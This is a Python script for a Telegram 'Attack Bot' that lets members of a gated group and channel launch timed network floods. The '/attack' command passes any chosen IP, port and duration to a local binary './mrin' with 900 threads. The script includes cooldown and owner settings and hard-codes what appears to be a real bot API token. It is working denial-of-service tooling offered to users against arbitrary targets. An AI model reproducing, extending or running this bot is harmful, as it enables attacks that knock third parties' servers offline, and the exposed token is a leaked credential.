import telebot
import subprocess
import shlex
import time
from threading import Thread

# Configuration
API_TOKEN = '7909374116:AAESmzi6HalD3N_3ZaelAsNKliMJVbU3th0'  # Replace with your actual API token
GROUP_ID = -1002422164782  # Replace with your actual group ID (negative value)
CHANNEL_ID = -1002533823555  # Replace with your actual channel ID (negative value)
CHANNEL_LINK = 'https://t.me/+e8QxfHRBB4gxMDQ9'  # Replace with your actual channel link
GROUP_LINK = 'https://t.me/+Dy0_lRT2rhBlZTM1'  # Replace with your actual group link
OWNER_ID = 5730843286  # Replace with your actual Telegram user ID (as a number)

bot = telebot.TeleBot(API_TOKEN)

# Cooldown settings
cooldown_time = 10  # in seconds
last_attack_time = {}

# Max duration settings
max_duration = 60  # in seconds; default max duration

# Additional settings
settings = {
    'cooldown_time': cooldown_time,
    'max_duration': max_duration,
}

def allowed_chat(message):
    """
    Returns True if the message is coming from the designated group
    or if the sender is the owner.
    """
    return message.chat.id == GROUP_ID or message.from_user.id == OWNER_ID

def attack(ip, port, time_duration, chat_id):
    """ Function to handle the attack command """
    command = f"./mrin {ip} {port} {time_duration} 900"  # Update this path if necessary
    try:
        process = subprocess.Popen(shlex.split(command), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()
        exit_code = process.returncode
        
        if exit_code == 0:
            bot.send_message(chat_id, f"✅ Attack started on IP: `{ip}` Port: `{port}` for {time_duration} seconds.", parse_mode='Markdown')
        else:
            bot.send_message(chat_id, f"⚠️ An error occurred: {stderr.decode()}", parse_mode='Markdown')
    except Exception as e:
        bot.send_message(chat_id, f"⚠️ An unexpected error occurred: {str(e)}", parse_mode='Markdown')

def is_user_in_channel(user_id):
    """ Check if the user is in the channel """
    try:
        user_status = bot.get_chat_member(CHANNEL_ID, user_id)
        return user_status.status != 'left'
    except Exception:
        return False

def is_user_in_group(user_id):
    """ Check if the user is in the group """
    try:
        user_status = bot.get_chat_member(GROUP_ID, user_id)
        return user_status.status in ['member', 'administrator', 'creator']
    except Exception:
        return False

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    # Allow usage if the message is in the allowed chat OR if the owner sends it from anywhere.
    if not allowed_chat(message):
        bot.reply_to(message, f"This bot can only be used in the specified group. Please join it here: {GROUP_LINK}")
        return

    welcome_text = (
        "✨ Welcome to the Attack Bot! ✨\n"
        "💡 Please join our channel to use this bot.\n"
        f"Join here: {CHANNEL_LINK}\n"
        f"Join our group here: {GROUP_LINK}\n\n"
        "🔧 **Available Commands:**\n"
        "/attack <ip> <port> <time in seconds> - Start an attack\n"
        "/setcooldown <seconds> - Set cooldown time (Owner only)\n"
        "/setmaxduration <seconds> - Set maximum duration (Owner only)\n"
        "/botsettings - View current bot settings\n"
        "/editsettings - Edit multiple settings (Owner only)"
    )
    bot.reply_to(message, welcome_text, parse_mode='Markdown')

@bot.message_handler(commands=['attack'])
def handle_attack_command(message):
    if not allowed_chat(message):
        bot.reply_to(message, f"This command can only be used in the designated group. Please join here: {GROUP_LINK}")
        return

    user_id = message.from_user.id
    
    # Check if user is a member of the channel and group (if not owner)
    if user_id != OWNER_ID:
        if not is_user_in_channel(user_id):
            bot.reply_to(message, f"You need to join the channel first to use this bot.\nJoin here: {CHANNEL_LINK}")
            return

        if not is_user_in_group(user_id):
            bot.reply_to(message, f"You need to be a member of the group to use this bot.\nJoin here: {GROUP_LINK}")
            return

    current_time = time.time()
    
    # Cooldown check
    if user_id in last_attack_time and (current_time - last_attack_time[user_id]) < settings['cooldown_time']:
        remaining_time = settings['cooldown_time'] - (current_time - last_attack_time[user_id])
        bot.reply_to(message, f"⏳ Please wait {remaining_time:.0f} seconds before using this command again.")
        return

    args = message.text.split()
    
    if len(args) != 4:
        bot.reply_to(message, "🛑 Usage: /attack <ip> <port> <time in seconds>")
        return
    
    ip = args[1]
    port = args[2]
    time_duration = args[3]

    # Validate the IP
    if not valid_ip(ip):
        bot.reply_to(message, "❌ Invalid IP address format.")
        return

    # Validate port number
    if not port.isdigit() or not (1 <= int(port) <= 65535):
        bot.reply_to(message, "❌ Invalid port number. It must be between 1 and 65535.")
        return

    # Validate time duration
    if not time_duration.isdigit() or int(time_duration) <= 0 or int(time_duration) > settings['max_duration']:
        bot.reply_to(message, f"❌ Invalid time. It must be a positive integer up to {settings['max_duration']} seconds.")
        return

    # Start a new thread to handle the attack process
    Thread(target=attack, args=(ip, port, time_duration, message.chat.id)).start()

    last_attack_time[user_id] = current_time

# The following command handlers now listen for both variants: with and without underscores.

@bot.message_handler(commands=['setcooldown', 'set_cooldown'])
def set_cooldown(message):
    # Owner-only command; allow from any chat if sender is OWNER_ID.
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "❌ You do not have permission to use this command.")
        return

    args = message.text.split()
    if len(args) != 2 or not args[1].isdigit() or int(args[1]) <= 0:
        bot.reply_to(message, "🛑 Usage: /setcooldown <seconds>")
        return
    
    settings['cooldown_time'] = int(args[1])
    bot.reply_to(message, f"✅ Cooldown time set to {settings['cooldown_time']} seconds.")

@bot.message_handler(commands=['setmaxduration', 'set_max_duration'])
def set_max_duration(message):
    # Owner-only command; allow from any chat if sender is OWNER_ID.
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "❌ You do not have permission to use this command.")
        return

    args = message.text.split()
    if len(args) != 2 or not args[1].isdigit() or int(args[1]) <= 0:
        bot.reply_to(message, "🛑 Usage: /setmaxduration <seconds>")
        return

    settings['max_duration'] = int(args[1])
    bot.reply_to(message, f"✅ Max duration set to {settings['max_duration']} seconds.")

@bot.message_handler(commands=['botsettings', 'bot_settings'])
def bot_settings(message):
    if not allowed_chat(message):
        bot.reply_to(message, f"This command can only be used in the designated group. Please join here: {GROUP_LINK}")
        return

    settings_message = (
        "🛠️ **Current Bot Settings:**\n"
        f"Cooldown Time: {settings['cooldown_time']} seconds\n"
        f"Max Duration: {settings['max_duration']} seconds\n"
    )
    bot.reply_to(message, settings_message, parse_mode='Markdown')

@bot.message_handler(commands=['editsettings', 'edit_settings'])
def edit_settings(message):
    # Owner-only command; allow from any chat if sender is OWNER_ID.
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "❌ You do not have permission to use this command.")
        return

    bot.reply_to(message, 
                 "Please provide the new cooldown time and max duration separated by a space.\n"
                 "Usage: /editsettings <cooldown_time> <max_duration>")
    bot.register_next_step_handler(message, update_settings)

def update_settings(message):
    try:
        values = list(map(int, message.text.split()))
        if len(values) != 2 or any(value <= 0 for value in values):
            bot.reply_to(message, "🛑 Invalid input. Please enter positive integers.")
            return
        
        settings['cooldown_time'], settings['max_duration'] = values
        bot.reply_to(message, "✅ Settings updated successfully!")

    except Exception as e:
        bot.reply_to(message, "🛑 An error occurred while updating settings. Please try again.")

def valid_ip(ip):
    parts = ip.split('.')
    if len(parts) != 4:
        return False
    for part in parts:
        if not part.isdigit() or not (0 <= int(part) <= 255):
            return False
    return True

# Start polling
bot.polling()
